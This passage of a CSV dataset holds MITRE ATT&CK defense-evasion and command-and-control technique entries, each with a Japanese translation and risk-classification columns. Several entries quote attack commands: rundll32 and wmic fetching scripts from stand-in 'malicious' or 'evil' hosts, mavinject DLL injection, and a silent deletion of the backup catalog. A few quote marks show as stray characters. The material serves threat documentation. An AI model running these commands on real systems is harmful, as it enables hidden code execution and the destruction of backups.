"";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""</code> This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion) Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>). Additionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion)","攻撃者は rundll32.exe を悪用し、悪意のあるコードの実行をプロキシする可能性があります。rundll32.exe を直接実行する（例：[共有モジュール](https://attack.mitre.org/techniques/T1129)）代わりに rundll32.exe を使用することで、許可リストや通常動作による誤検知のため、rundll32.exe プロセスを監視しないセキュリティツールの作動を回避できる可能性があります。 Rundll32.exe は、一般的に DLL ペイロードの実行に関連付けられています（例：<code>rundll32.exe {DLLname, DLLfunction}</code>）。 また、文書化されていない shell32.dll 関数 <code>Control_RunDLL</code> および <code>Control_RunDLLAsUser</code> を通じて、[コントロールパネル](https://attack.mitre.org/techniques/T1218/002) 項目ファイル (.cpl) を実行するためにも使用できます。 .cpl ファイルをダブルクリックしても rundll32.exe が実行されます（引用元：Trend Micro CPL）。たとえば、[ClickOnce](https://attack.mitre.org/techniques/T1127/002) は Rundll32.exe を通じてプロキシできます。Rundll32 は JavaScript などのスクリプトの実行にも使用できます。 以下のような構文で実現可能です：<code>rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""</code> この動作はPoweliksなどのマルウェアで確認されています。 (引用元: This is Security Command Line Confusion) 攻撃者は、rundll32.exe が DLL 関数名をロードする方法を悪用して、悪意のあるコードを分析から隠蔽しようとする場合もあります。 Windows の各種文字セット互換性サポートの一環として、rundll32.exe は指定された関数をロードする前に、ワイド/Unicode 対応関数、次に ANSI 文字対応関数を順にチェックします（例：コマンド <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>の場合、rundll32.exeはまず<code>ExampleFunctionW</code>を実行し、それが失敗した場合に<code>ExampleFunctionA</code>を実行し、最後に<code>ExampleFunction</code>をロードする）。したがって攻撃者は、同一のエクスポート関数名を複数作成し、無害な関数名に<code>W</code>や<code>A</code>を付加することで悪意のあるコードを隠蔽できる。(引用: Attackify Rundll32.exe Obscurity)(引用: Github NoRunDll) DLL関数は、順序番号（例: <code>rundll32.exe file.dll,#1</code>）によってもエクスポートおよび実行できます。 さらに、攻撃者は悪意のあるペイロードの実行をさらに隠蔽するために、[偽装](https://attack.mitre.org/techniques/T1036) 技術（DLL ファイル名、ファイル拡張子、関数名の変更など）を使用する場合があります。(引用: rundll32.exe defense evasion)",defense-evasion,Windows,script_command_execution,stealth,authentication_system;user_interaction;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;File Server;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5,2020-01-23T18:03:46.248Z,2025-04-15T19:58:02.470Z,,,,
T1218.012,T1218,Verclsid,Verclsid,"Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.(Citation: WinOSBite verclsid.exe) Adversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running <code>verclsid.exe /S /C {CLSID}</code>, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010)). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.(Citation: LOLBAS Verclsid)(Citation: Red Canary Verclsid.exe)(Citation: BOHOPS Abusing the COM Registry)(Citation: Nick Tyrer GitHub)",攻撃者は、verclsid.exe を悪用して悪意のあるコードの実行をプロキシする場合があります。verclsid.exe は、拡張 CLSID 検証ホストとして知られており、Windows エクスプローラまたは Windows シェルによって使用される前に、各シェル拡張を検証する役割を担っています。(引用: WinOSBite verclsid.exe)攻撃者は、verclsid.exe を悪用して悪意のあるペイロードを実行する場合があります。 これは、<code>verclsid.exe /S /C {CLSID}</code> を実行することで達成される。ここで、ファイルは COM オブジェクトを識別するために使用される一意の識別番号であるクラス ID (CLSID) によって参照される。 verclsid.exeによって実行されるCOMペイロードは、リモートサーバーからのCOMスクリプトリット（SCT）のロードと実行など、様々な悪意のある動作を実行できる可能性があります（[Regsvr32](https://attack.mitre.org/techniques/T1218/010)と同様）。 このバイナリはWindowsシステム上で署名済みおよび／またはネイティブである可能性があるため、verclsid.exeを介したプロキシ実行は、その悪用可能性を考慮していないアプリケーション制御ソリューションを迂回する可能性があります。（引用元：LOLBAS Verclsid）（引用元：Red Canary Verclsid.exe）（引用元：BOHOPS Abusing the COM Registry）（引用元：Nick Tyrer GitHub）,defense-evasion,Windows,script_command_execution,stealth,endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--808e6329-ca91-4b87-ac2d-8eadc5f8f327,2020-08-10T13:59:38.443Z,2025-04-15T19:58:46.323Z,,,,
T1218.013,T1218,Mavinject,Mavinject,"Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).(Citation: LOLBAS Mavinject) Adversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001)), allowing for arbitrary code execution (ex. <code>C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>).(Citation: ATT Lazarus TTP Evolution)(Citation: Reaqta Mavinject) Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process. In addition to [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001), Mavinject.exe can also be abused to perform import descriptor injection via its <code>/HMODULE</code> command-line parameter (ex. <code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.(Citation: Mavinject Functionality Deconstructed)",攻撃者はmavinject.exeを悪用し、悪意のあるコードの実行をプロキシする可能性がある。mavinject.exeはMicrosoft Application Virtualization Injectorであり、Microsoft Application Virtualization（App-V）の一部として外部プロセスにコードを注入できるWindowsユーティリティである。(引用: LOLBAS Mavinject)攻撃者は mavinject.exe を悪用して、実行中のプロセスに悪意のある DLL を注入し (すなわち [ダイナミックリンクライブラリ注入](https://attack.mitre.org/techniques/T1055/001))、任意のコードを実行 (例: <code>C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>）。(引用元: ATT Lazarus TTP Evolution)(引用元: Reaqta Mavinject) mavinject.exe はマイクロソフトによるデジタル署名が付与されている可能性があるため、この手法による実行プロキシは正当なプロセスに隠蔽されることでセキュリティ製品の検知を回避する恐れがある。 [ダイナミックリンクライブラリインジェクション](https://attack.mitre.org/techniques/T1055/001)に加え、Mavinject.exe は <code>/HMODULE</code> コマンドラインパラメータを介したインポート記述子インジェクションにも悪用可能です （例：<code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>）。このコマンドは、指定されたDLLから成るインポートテーブルエントリを、与えられたベースアドレスのモジュールに注入します。（引用元: Mavinject Functionality Deconstructed）,defense-evasion,Windows,script_command_execution,stealth,user_interaction;endpoint_execution;network_connectivity,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--1bae753e-8e52-4055-a66d-2ead90303ca9,2021-09-22T17:45:10.241Z,2025-04-15T22:48:44.734Z,,,,
T1218.014,T1218,MMC,MMC,"Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.(Citation: win_mmc)(Citation: what_is_mmc) MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.(Citation: win_msc_files_overview) For example, <code>mmc C:\Users\foo\admintools.msc /a</code> will open a custom, saved console msc file in author mode.(Citation: win_mmc) Another common example is <code>mmc gpedit.msc</code>, which will open the Group Policy Editor application window. Adversaries may use MMC commands to perform malicious tasks. For example, <code>mmc wbadmin.msc delete catalog -quiet</code> deletes the backup catalog on the system (i.e. [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)) without prompts to the user (Note: <code>wbadmin.msc</code> may only be present by default on Windows Server operating systems).(Citation: win_wbadmin_delete_catalog)(Citation: phobos_virustotal) Adversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) class object.(Citation: win_clsid_key) Then, adversaries may create custom consoles with the “Link to Web Address Esnap-in that is linked to the malicious CLSID subkey.(Citation: mmc_vulns) Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: <code>mmc.exe -Embedding C:\path\to\test.msc</code>.(Citation: abusing_com_reg)",攻撃者は、悪意のある .msc ファイルの実行をプロキシするために mmc.exe を悪用する可能性があります。Microsoft Management Console (MMC) は、Microsoft によって署名される可能性のあるバイナリであり、GUI またはコマンドプロンプトのいずれかでいくつかの方法で使用されます。(引用: win_mmc)(引用: what_is_mmc) MMC を使用して、スナップインと呼ばれる Microsoft によって作成された管理ツールを含むカスタムコンソールを作成、開く、保存することができます。 これらのスナップインは、Windowsシステムをローカルまたはリモートで管理するために使用できます。MMCはまた、システム構成を管理するためにMicrosoftが作成した.mscファイルを開くのにも使用できます。(引用: win_msc_files_overview) 例えば、<code>mmc C:\Users\foo\admintools.msc /a</code> は、保存されたカスタムコンソールmscファイルを編集モードで開きます。（引用元: win_mmc）別の一般的な例として、<code>mmc gpedit.msc</code> はグループ ポリシー エディター アプリケーション ウィンドウを開きます。攻撃者は MMC コマンドを利用して悪意のあるタスクを実行する可能性があります。例えば、 <code>mmc wbadmin.msc delete catalog -quiet</code> は、ユーザーへのプロンプトなしにシステムのバックアップカタログを削除します（つまり、[システム回復の抑制](https://attack.mitre.org/techniques/T1490)）。（注：<code>wbadmin.msc</code> はデフォルトで Windows Server オペレーティングシステムにのみ存在する可能性があります）。(引用元: win_wbadmin_delete_catalog)(引用元: phobos_virustotal) 攻撃者はMMCを悪用して悪意のある.mscファイルを実行する可能性もあります。 たとえば、攻撃者はまず、[コンポーネント オブジェクト モデル](https://attack.mitre.org/techniques/T1559/001) クラス オブジェクトを一意に識別する悪意のあるレジストリのクラス識別子 (CLSID) サブキーを作成する場合があります。(引用: win_clsid_key) 次に、悪意のある CLSID サブキーにリンクされた「Web アドレスへのリンク Esnap-in」を使用して、カスタムコンソールを作成します。(引用元: mmc_vulns) .msc ファイルが保存されると、攻撃者は次のコマンドで悪意のある CLSID ペイロードを呼び出す可能性があります: <code>mmc.exe -Embedding C:\path\to\test.msc</code>。(引用元: abusing_com_reg),defense-evasion,Windows,script_command_execution,stealth,user_interaction;endpoint_execution;endpoint_management;network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,Backup Server;Business Workstation;Log / Monitoring Server;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--ffbcfdb0-de22-4106-9ed3-fc23c8a01407,2021-09-28T01:36:41.638Z,2025-04-16T20:37:23.449Z,,,,
T1218.015,T1218,Electron Applications,Electronアプリケーション,"Adversaries may abuse components of the Electron framework to execute malicious code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams.(Citation: Electron 2) Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS.(Citation: Electron 3) The Chromium engine is used to display web content and Node.js runs the backend code.(Citation: Electron 1) Due to the functional mechanics of Electron (such as allowing apps to run arbitrary commands), adversaries may also be able to perform malicious functions in the background potentially disguised as legitimate tools within the framework.(Citation: Electron 1) For example, the abuse of `teams.exe` and `chrome.exe` may allow adversaries to execute malicious commands as child processes of the legitimate application (e.g., `chrome.exe --disable-gpu-sandbox --gpu-launcher=""C:\Windows\system32\cmd.exe /c calc.exe`).(Citation: Electron 6-8) Adversaries may also execute malicious content by planting malicious [JavaScript](https://attack.mitre.org/techniques/T1059/007) within Electron applications.(Citation: Electron Security)","攻撃者はElectronフレームワークのコンポーネントを悪用し、悪意のあるコードを実行する可能性があります。ElectronフレームワークはSignal、Slack、Microsoft Teamsなど多くの一般的なアプリケーションをホストしています。(引用: Electron 2) GitHubによって開発されたElectronは、JavaScript、HTML、CSSなどのウェブ技術を採用したクロスプラットフォームデスクトップアプリケーション開発フレームワークです。(引用: Electron 3) ウェブコンテンツの表示にはChromiumエンジンが使用され、バックエンドコードはNode.jsで実行されます。(引用: Electron 1) Electronの機能的仕組み（アプリが任意のコマンドを実行できるなど）により、攻撃者はフレームワーク内で正当なツールを装い、バックグラウンドで悪意のある機能を実行できる可能性があります。(引用: Electron 1) 例えば、`teams.exe`や`chrome.exe`の悪用により、攻撃者は正当なアプリケーションの子プロセスとして悪意のあるコマンドを実行できる可能性があります（例: `chrome.exe --disable-gpu-sandbox --gpu-launcher=""C:\Windows\system32\cmd.exe /c calc.exe`）。(引用: Electron 6-8) 攻撃者はまた、Electronアプリケーション内に悪意のある[JavaScript](https://attack.mitre.org/techniques/T1059/007)を埋め込むことで悪意のあるコンテンツを実行する可能性があります。(引用: Electron Security)",defense-evasion,macOS;Windows;Linux,script_command_execution,stealth,endpoint_execution;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--561ae9aa-c28a-4144-9eec-e7027a14c8c3,2024-03-07T19:32:35.383Z,2025-04-15T22:24:54.174Z,,,,
T1219,,Remote Access Tools,リモートアクセスツール,"An adversary may use legitimate remote access tools to establish an interactive command and control channel within a network. Remote access tools create a session between two trusted hosts through a graphical interface, a command line interaction, a protocol tunnel via development or management software, or hardware-level access such as KVM (Keyboard, Video, Mouse) over IP solutions. Desktop support software (usually graphical interface) and remote management software (typically command line interface) allow a user to control a computer remotely as if they are a local user inheriting the user or software permissions. This software is commonly used for troubleshooting, software installation, and system management.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy) Adversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access. Remote access tools may be installed and used post-compromise as an alternate communications channel for redundant access or to establish an interactive remote desktop session with the target system. It may also be used as a malware component to establish a reverse connection or back-connect to a service or adversary-controlled system. Installation of many remote access tools may also include persistence (e.g., the software's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome’s Remote Desktop).(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop)",攻撃者は、正当なリモートアクセスツールを使用して、ネットワーク内に双方向のコマンド＆コントロールチャネルを確立する可能性があります。リモートアクセスツールは、グラフィカルインターフェイス、コマンドライン操作、開発/管理ソフトウェア経由のプロトコルトンネル、またはIP経由のKVM（キーボード、ビデオ、マウス）ソリューションなどのハードウェアレベルアクセスを通じて、2つの信頼されたホスト間にセッションを確立します。 デスクトップサポートソフトウェア（通常はグラフィカルインターフェース）とリモート管理ソフトウェア（典型的にはコマンドラインインターフェース）は、ユーザーがローカルユーザーとして継承したユーザー権限やソフトウェア権限を保持した状態で、遠隔からコンピュータを制御することを可能にする。この種のソフトウェアは、トラブルシューティング、ソフトウェアインストール、システム管理に広く利用される。（引用元：Symantec Living off the Land）（引用元：CrowdStrike 2015 Global Threat Report）（引用元：CrySyS Blog TeamSpy）攻撃者は同様に、EDRやその他の防御ツールに組み込まれたリモートアクセスを可能にする対応機能を悪用する可能性があります。リモートアクセスツールは侵害後にインストールされ、冗長アクセス用の代替通信チャネルとして、または標的システムとの対話型リモートデスクトップセッションを確立するために使用される場合があります。 また、サービスや攻撃者が制御するシステムへの逆接続（バックコネクト）を確立するマルウェアコンポーネントとして使用される場合もある。多くのリモートアクセスツールのインストールには永続化機能が含まれる（例：ソフトウェアのインストーラが[Windowsサービス](https://attack.mitre.org/techniques/T1543/003)を作成する）。 リモートアクセスモジュール/機能は、既存ソフトウェアの一部として存在するケースもある（例：Google Chromeのリモートデスクトップ）。(引用: Google Chrome Remote Desktop)(引用: Chrome Remote Desktop),command-and-control,Linux;Windows;macOS,credential_abuse,remote_control,authentication_system;user_interaction;endpoint_execution;network_connectivity;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7,2018-04-18T17:59:24.739Z,2025-04-15T19:58:25.651Z,,,,
T1219.001,T1219,IDE Tunneling,IDEトンネリング,"Adversaries may abuse Integrated Development Environment (IDE) software with remote development features to establish an interactive command and control channel on target systems within a network. IDE tunneling combines SSH, port forwarding, file sharing, and debugging into a single secure connection, letting developers work on remote systems as if they were local. Unlike SSH and port forwarding, IDE tunneling encapsulates an entire session and may use proprietary tunneling protocols alongside SSH, allowing adversaries to blend in with legitimate development workflows. Some IDEs, like Visual Studio Code, also provide CLI tools (e.g., `code tunnel`) that adversaries may use to programmatically establish tunnels and generate web-accessible URLs for remote access. These tunnels can be authenticated through accounts such as GitHub, enabling the adversary to control the compromised system via a legitimate developer portal.(Citation: sentinelone operationDigitalEye Dec 2024)(Citation: Unit42 Chinese VSCode 06 September 2024)(Citation: Thornton tutorial VSCode shell September 2023) Additionally, adversaries may use IDE tunneling for persistence. Some IDEs, such as Visual Studio Code and JetBrains, support automatic reconnection. Adversaries may configure the IDE to auto-launch at startup, re-establishing the tunnel upon execution. Compromised developer machines may also be exploited as jump hosts to move further into the network. IDE tunneling tools may be built-in or installed as [IDE Extensions](https://attack.mitre.org/techniques/T1176/002).",攻撃者は、リモート開発機能を備えた統合開発環境（IDE）ソフトウェアを悪用し、ネットワーク内のターゲットシステム上で対話型のコマンド＆コントロールチャネルを確立する可能性があります。IDEトンネリングは、SSH、ポートフォワーディング、ファイル共有、デバッグを単一のセキュアな接続に統合し、開発者がリモートシステムをローカルシステムのように操作できるようにします。 SSHやポート転送とは異なり、IDEトンネリングはセッション全体をカプセル化し、SSHと並行して独自トンネリングプロトコルを使用する場合があるため、攻撃者は正当な開発ワークフローに紛れ込める。Visual Studio Codeなどの一部IDEはCLIツール（例：`code tunnel`）も提供しており、攻撃者はこれを利用してプログラム的にトンネルを確立し、リモートアクセス用のWebアクセス可能URLを生成できる。 これらのトンネルはGitHubなどのアカウントで認証可能であり、攻撃者は正当な開発者ポータル経由で侵害システムを制御できる。（引用元: sentinelone operationDigitalEye Dec 2024）（引用元: Unit42 Chinese VSCode 06 September 2024）（引用元: Thornton tutorial VSCode shell September 2023）さらに攻撃者はIDEトンネリングを永続化手段として利用する可能性がある。 Visual Studio Code や JetBrains などの一部の IDE は、自動再接続をサポートしています。 攻撃者は、起動時に IDE が自動起動するよう設定し、実行時にトンネルを再確立することができます。侵害された開発者マシンは、ネットワークのさらに奥深くへ侵入するためのジャンプホストとして悪用される可能性もあります。IDE トンネリングツールは、組み込みである場合もあれば、[IDE 拡張機能](https://attack.mitre.org/techniques/T1176/002) としてインストールされる場合もあります。,command-and-control,Linux;Windows;macOS,credential_abuse,remote_control,authentication_system;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--77e29a47-e263-4f11-8692-e5012f44dbac,2025-03-20T18:46:24.598Z,2025-04-22T16:34:13.454Z,,,,
T1219.002,T1219,Remote Desktop Software,リモートデスクトップソフトウェア,"An adversary may use legitimate desktop support software to establish an interactive command and control channel to target systems within networks. Desktop support software provides a graphical interface for remotely controlling another computer, transmitting the display output, keyboard input, and mouse control between devices using various protocols. Desktop support software, such as `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy) Remote access modules/features may also exist as part of otherwise existing software such as Zoom or Google Chrome’s Remote Desktop.(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop)",攻撃者は、正当なデスクトップサポートソフトウェアを利用して、ネットワーク内の標的システムへの対話型コマンド＆コントロールチャネルを確立する可能性があります。デスクトップサポートソフトウェアは、リモートで別のコンピュータを制御するためのグラフィカルインターフェースを提供し、様々なプロトコルを用いてデバイス間でディスプレイ出力、キーボード入力、マウス操作を伝送します。 `VNC`、`Team Viewer`、`AnyDesk`、`ScreenConnect`、`LogMein`、`AmmyyAdmin`などのデスクトップサポートソフトウェアやその他のリモート監視管理（RMM）ツールは、正当なテクニカルサポートソフトウェアとして一般的に使用され、標的環境内のアプリケーション制御によって許可される可能性があります。(引用: Symantec Living off the Land)(引用: CrowdStrike 2015 Global Threat Report)(引用: CrySyS Blog TeamSpy)リモートアクセスモジュール/機能は、ZoomやGoogle Chromeのリモートデスクトップなど、既存ソフトウェアの一部として存在する可能性もある。(引用: Google Chrome Remote Desktop)(引用: Chrome Remote Desktop),command-and-control,Linux;macOS;Windows,script_command_execution,remote_control,endpoint_execution;network_connectivity;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--d4287702-e2f7-4946-bdfa-2c7f5aaa5032,2025-03-24T22:24:47.684Z,2025-04-16T16:42:15.226Z,,,,
T1219.003,T1219,Remote Access Hardware,リモートアクセスハードウェア,"An adversary may use legitimate remote access hardware to establish an interactive command and control channel to target systems within networks. These services, including IP-based keyboard, video, or mouse (KVM) devices such as TinyPilot and PiKVM, are commonly used as legitimate tools and may be allowed by peripheral device policies within a target environment. Remote access hardware may be physically installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote session with the target system. Using hardware-based remote access tools may allow threat actors to bypass software security solutions and gain more control over the compromised device(s).(Citation: Palo Alto Unit 42 North Korean IT Workers 2024)(Citation: Google Cloud Threat Intelligence DPRK IT Workers 2024)",攻撃者は、ネットワーク内の標的システムへの対話型コマンド＆コントロールチャネルを確立するために、正当なリモートアクセスハードウェアを使用する可能性がある。TinyPilotやPiKVMなどのIPベースのキーボード・ビデオ・マウス（KVM）デバイスを含むこれらのサービスは、一般的に正当なツールとして使用され、標的環境内の周辺機器ポリシーによって許可されている場合がある。 侵害後、物理的に設置されたリモートアクセスハードウェアは、冗長アクセス用の代替通信チャネルとして、または標的システムとの対話型リモートセッション確立手段として使用される可能性がある。 ハードウェアベースのリモートアクセスツールを使用することで、脅威アクターはソフトウェアセキュリティソリューションを迂回し、侵害されたデバイスに対するより大きな制御権を獲得できる可能性がある。(引用: Palo Alto Unit 42 North Korean IT Workers 2024)(引用: Google Cloud Threat Intelligence DPRK IT Workers 2024),command-and-control,Linux;macOS;Windows,credential_abuse,remote_control,authentication_system;endpoint_execution;network_connectivity;cloud_control_plane,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--a9fb6b3f-4a3c-4703-a4f1-f55f83d1e017,2025-03-26T15:36:18.409Z,2025-05-02T19:13:42.314Z,,,,
T1220,,XSL Script Processing,XSLスクリプト処理,"Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017) Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019) Command-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019) * <code>msxsl.exe customers[.]xml script[.]xsl</code> * <code>msxsl.exe script[.]xsl script[.]xsl</code> * <code>msxsl.exe script[.]jpeg script[.]jpeg</code> Another variation of this technique, dubbed “Squiblytwo E involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ ""Squiblydoo"" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019) Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic) * Local File: <code>wmic process list /FORMAT:evil[.]xsl</code> * Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl E/code>","攻撃者は、XSLファイル内にスクリプトを埋め込むことでアプリケーション制御を回避し、コードの実行を隠蔽する可能性があります。拡張スタイルシート言語（XSL）ファイルは、XMLファイル内のデータの処理とレンダリングを記述するために一般的に使用されます。複雑な操作をサポートするため、XSL標準は様々な言語での埋め込みスクリプティングをサポートしています。（引用元：Microsoft XSLT Script 2017年3月）攻撃者はこの機能を悪用し、アプリケーション制御を回避しながら任意のファイルを実行する可能性があります。 [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127)と同様に、Microsoft共通ライン変換ユーティリティバイナリ（msxsl.exe）（引用元：Microsoft msxsl.exe）をインストールし、ローカルまたはリモート（URL参照）のXSLファイル内に埋め込まれた悪意のあるJavaScriptを実行するために使用できます。 (引用元: Penetration Testing Lab MSXSL July 2017) msxsl.exe はデフォルトではインストールされないため、攻撃者はドロップしたファイルに同ユーティリティを同梱する必要がある。(引用元: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe は主に 2 つの引数、XML ソースファイルと XSL スタイルシートを受け取る。 XSLファイルは有効なXMLであるため、攻撃者は同一のXSLファイルを2回呼び出す可能性がある。msxsl.exe使用時、攻撃者はXML/XSLファイルに任意の拡張子を付与することも可能である。(引用: XSL Bypass Mar 2019) コマンドライン例:(引用: Penetration Testing Lab MSXSL July 2017)(引用: XSL Bypass Mar 2019) * <code>msxsl.exe customers[.]xml script[.]xsl</code> * <code>msxsl.exe script[.]xsl script[.]xsl</code> * <code>msxsl.exe script[.]jpeg script[.]jpeg</code>この手法の別バリエーションである「Squiblytwo E」は、[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) を利用してXSLファイル内でJScriptまたはVBScriptを呼び出すものである。(引用元: LOLBAS Wmic) この手法もローカル/リモートスクリプトを実行可能であり、[Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ ""スクイブルドゥー"" 版と同様に、信頼された組み込みの Windows ツールを利用します。 攻撃者は、/FORMAT スイッチを利用すれば、[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) のあらゆるエイリアスを悪用できる。(引用元: XSL Bypass Mar 2019)コマンドラインの例:(引用元: XSL Bypass Mar 2019)(引用元: LOLBAS Wmic) * ローカルファイル: <code>wmic process list /FORMAT:evil[.]xsl</code> * リモートファイル: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl E/code>",defense-evasion,Windows,script_command_execution,stealth,user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3,2018-10-17T00:14:20.652Z,2025-04-15T19:59:19.125Z,,,,
